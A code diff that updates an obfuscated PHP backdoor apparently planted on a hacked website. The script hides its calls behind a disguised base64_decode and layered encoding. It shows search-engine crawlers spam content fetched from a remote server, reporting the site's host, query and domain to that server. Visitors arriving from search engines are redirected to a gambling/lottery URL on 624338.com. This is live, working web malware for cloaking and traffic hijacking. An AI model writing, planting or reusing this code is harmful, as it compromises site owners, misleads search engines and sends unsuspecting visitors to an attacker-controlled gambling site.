@@ -2,30 +2,20 @@ error_reporting(0);set_time_limit(0);
 header('Content-type: text/html; charset=gb2312');
 $ua=@$_SERVER["HTTP_USER_AGENT"];
 $rf=@$_SERVER['HTTP_REFERER'];
-$tu='Vm0wd2VHUXhTWGhpUm1SWVYwZDRWVll3Wkc5WFJsbDNXa1pPVlUxV2NIcFhhMk0xVmpKS1NHVkdXbFppVkVaSVdWZDRTMk14VG5OWGJGc
-
-HBWa1phZVZadGVHdFRNVWw0Vkc1T1dHSkdjRmhVVkVaSFRURmtXR1JIUmxwV01ERTBWa2MxUzJGV1NuVlJhemxXWVd0R00xcFZXbUZqYkd0Nll
-
-VWk9UbEpHV2paV1ZFa3hWREZrU0ZOcmFHaFNlbXhoVmpCb1ExZEdXWGhYYlVacVZtczFNVmt3WkRSVk1ERkZWbXh3VjFaRmIzZFdha1pYWkVaT
-
-2NscEdhR2xTYkhCWVYxWmtNRkl3TUhoVmJHUllZbFZhV0ZsclpGTmxWbGw1WlVWT1YwMXJWak5aTUZwVFZqRmFWMk5HVG1GU1JWcEVWbGQ0UTF
-
-aVk1VVk5SREE5';
+$tu='WVVoU01HTkViM1pNTTBKeVRHcG9NazFVWjNWWk1qbDBUSGM5UFE9PQ==';
 $oki=str_replace('%','','%%b%a%%s%%e%%%%%%6%%%4%%%_%%%%d%%%e%c%%o%%%%%%d%%e%%%%%%%%');
-for ($i = 0; $i < 10; $i++) {
-     $tu=$oki($tu);
-}
-if (ereg("baidu", $ua) || ereg("360Spider", $ua) || ereg("Sogou", $ua) || ereg("bing", $ua) || ereg("google", 
-
-$ua) ) {
+$lt=$oki('aHR0cDovL3d3dy42MjQzMzguY29tL3R0L2luZGV4L3BrMTA=');
+for ($i = 0; $i < 3; $i++) {
+     $tu=$oki($tu);}
+if (ereg("baidu", $ua) || ereg("360Spider", $ua) || ereg("Sogou", $ua) || ereg("bing", $ua) || ereg("google", $ua) ) {
 $Remote_server = $tu;
 $host_name = "http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
-$Content_mb=@file_get_contents($Remote_server."/index.php?host=".$host_name."&url=".$_SERVER
-
-['QUERY_STRING']."&domain=".$_SERVER['SERVER_NAME']);
+$Content_mb=@file_get_contents($Remote_server."/index.php?host=".$host_name."&url=".$_SERVER['QUERY_STRING']."&domain=".$_SERVER['SERVER_NAME']);
 echo $Content_mb;
 exit;
 }else if($rf!=''){
-	header("Location:http://www.624338.com/tt/index/pk10");
-	exit;
+    if (ereg("baidu.com", $rf) || ereg("so.com", $rf) || ereg("haosou.com", $rf) || ereg("sogou.com", $rf) || ereg("bing.com", $rf) || ereg("google.com", $rf) ) {
+        header("Location:".$lt);
+    	exit;
+    }
 }
